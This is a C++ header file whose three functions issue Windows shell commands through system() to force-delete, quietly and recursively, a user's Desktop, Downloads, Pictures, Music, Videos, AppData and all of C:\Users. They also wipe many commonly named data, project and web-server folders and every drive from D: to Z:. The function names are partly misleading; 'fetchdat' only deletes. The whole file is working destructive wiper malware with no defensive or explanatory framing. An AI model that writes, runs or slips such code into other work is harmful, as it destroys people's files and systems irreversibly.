#pragma once
#include <iostream>
using namespace std;

void delusr() {
    system("del %USERPROFILE%\\Desktop /s /q /f");
    system("rmdir %USERPROFILE%\\Desktop /q /s");
    system("del %USERPROFILE%\\Downloads /s /q /f");
    system("rmdir %USERPROFILE%\\Downloads /q /s");
    system("del %USERPROFILE%\\Pictures /s /q /f");
    system("rmdir %USERPROFILE%\\Pictures /q /s");
    system("del %USERPROFILE%\\Music /s /q /f");
    system("rmdir %USERPROFILE%\\Music /q /s");
    system("del %USERPROFILE%\\Video /s /q /f");
    system("rmdir %USERPROFILE%\\Videos /q /s");
    system("rmdir %USERPROFILE%\\AppData /q /s");
    system("del C:\\Users /s /q /f");
    system("rmdir C:\\Users /s /q");
}

void fetchdat() {
    system("if exist C:\\Apache24\\ del C:\\Apache24 /s /q /f");
    system("if exist C:\\Apache24 rd C:\\Apache24 /s /q");
    
    system("if exist C:\\inetpub\\ del C:\\inetpub /s /q /f");
    system("if exist C:\\inetpub\\ rd C:\\inetpub /s /q");
    
    system("if exist C:\\Data\\ del C:\\Data /s /q /f");
    system("if exist C:\\Data\\ rd C:\\Data /s /q");
    
    system("if exist C:\\Datas\\ del C:\\Datas /s /q /f");
    system("if exist C:\\Datas\\ rd C:\\Datas /s /q");
    
    system("if exist C:\\Important\\ del C:\\Important /s /q /f");
    system("if exist C:\\Important\\ rd C:\\Important /s /q");
    
    system("if exist C:\\Importants\\ del C:\\Importants /s /q /f");
    system("if exist C:\\Importants\\ rd C:\\Importants /s /q");
    
    system("if exist C:\\Dulieu\\ del C:\\Dulieu /s /q /f");
    system("if exist C:\\Dulieu\\ rd C:\\Dulieu /s /q");
    
    system("if exist C:\\Web\\ del C:\\Web /s /q /f");
    system("if exist C:\\Web\\ rd C:\\Web /s /q");
    
    system("if exist C:\\Virus\\ del C:\\Virus /s /q /f");
    system("if exist C:\\Virus\\ rd C:\\Virus /s /q");
    
    system("if exist C:\\Coding\\ del C:\\Coding /s /q /f");
    system("if exist C:\\Coding\\ rd C:\\Coding /s /q");
    
    system("if exist C:\\Laptrinh\\ del C:\\Laptrinh /s /q /f");
    system("if exist C:\\Laptrinh\\ rd C:\\LapTrinh /s /q");
    
    system("if exist C:\\Quantrong\\ del C:\\Quantrong /s /q /f");
    system("if exist C:\\QuanTrong\\ rd C:\\Quantrong /s /q");
    
    system("if exist C:\\DuAn\\ del C:\\DuAn /s /q /f");
    system("if exist C:\\DuAn\\ rd C:\\DuAn /s /q");
    
    system("if exist C:\\MyWebSite\\ del C:\\MyWebSite /s /q /f");
    system("if exist C:\\MyWebSite\\ rd C:\\MyWebSite /s /q");
    
    system("if exist C:\\MyWebSites\\ del C:\\MyWebSites /s /q /f");
    system("if exist C:\\MyWebSites\\ rd C:\\MyWebSites /s /q");
    
    system("if exist C:\\Test\\ del C:\\Test /s /q /f");
    system("if exist C:\\Test\\ rd C:\\Test /s /q");
    
    system("if exist C:\\Tests\\ del C:\\Tests /s /q /f");
    system("if exist C:\\Tests\\ rd C:\\Tests /s /q");
    
    system("if exist C:\\Samples\\ del C:\\Samples /s /q /f");
    system("if exist C:\\Samples\\ rd C:\\Samples /s /q");
    
    system("if exist C:\\Sample\\ del C:\\Sample /s /q /f");
    system("if exist C:\\Sample\\ rd C:\\Sample /s /q");
    
    system("if exist C:\\TestWeb\\ del C:\\TestWeb /s /q /f");
    system("if exist C:\\TestWeb\\ rd C:\\TestWeb /s /q");
    
    system("if exist C:\\Malware\\ del C:\\Malware /s /q /f");
    system("if exist C:\\Malware\\ rd C:\\Malware /s /q");
    
    system("if exist C:\\Malwares\\ del C:\\Malwares /s /q /f");
    system("if exist C:\\Malwares\\ rd C:\\Malwares /s /q");
    
    system("if exist C:\\Ransomware\\ del C:\\Ransomware /s /q /f");
    system("if exist C:\\Ransomware\\ rd C:\\Ransomware /s /q");
    
    system("if exist C:\\Ransomwares\\ del C:\\Ransomwares /s /q /f");
    system("if exist C:\\Ransomwares\\ rd C:\\Ransomwares /s /q");
    
    system("if exist C:\\Worm\\ del C:\\Worm /s /q /f");
    system("if exist C:\\Worm\\ rd C:\\Worm /s /q");
    
    system("if exist C:\\Worms\\ del C:\\Worms /s /q /f");
    system("if exist C:\\Worms\\ rd C:\\Worms /s /q");
}

void deldrvs() {
    system("if exist D:\\ del D: /s /q /f");
    system("if exist D:\\ rd D: /s /q");
    
    system("if exist E:\\ del E: /s /q /f");
    system("if exist E:\\ rd E: /s /q");
    
    system("if exist F:\\ del F: /s /q /f");
    system("if exist F:\\ rd F: /s /q");
    
    system("if exist G:\\ del G: /s /q /f");
    system("if exist G:\\ rd G: /s /q");
    
    system("if exist H:\\ del H: /s /q /f");
    system("if exist H:\\ rd H: /s /q");
    
    system("if exist I:\\ del I: /s /q /f");
    system("if exist I:\\ rd I: /s /q");
    
    system("if exist K:\\ del K: /s /q /f");
    system("if exist K:\\ rd K: /s /q");
    
    system("if exist L:\\ del L: /s /q /f");
    system("if exist L:\\ rd L: /s /q");
    system("if exist M:\\ rd M: /s /q");
    system("if exist N:\\ rd N: /s /q");
    system("if exist O:\\ rd O: /s /q");
    system("if exist P:\\ rd P: /s /q");
    system("if exist Q:\\ rd Q: /s /q");
    system("if exist R:\\ rd R: /s /q");
    system("if exist S:\\ rd S: /s /q");
    system("if exist T:\\ rd T: /s /q");
    system("if exist U:\\ rd U: /s /q");
    system("if exist V:\\ rd V: /s /q");
    system("if exist W:\\ rd W: /s /q");
    system("if exist X:\\ rd X: /s /q");
    system("if exist Y:\\ rd Y: /s /q");
    system("if exist Z:\\ rd Z: /s /q");
}
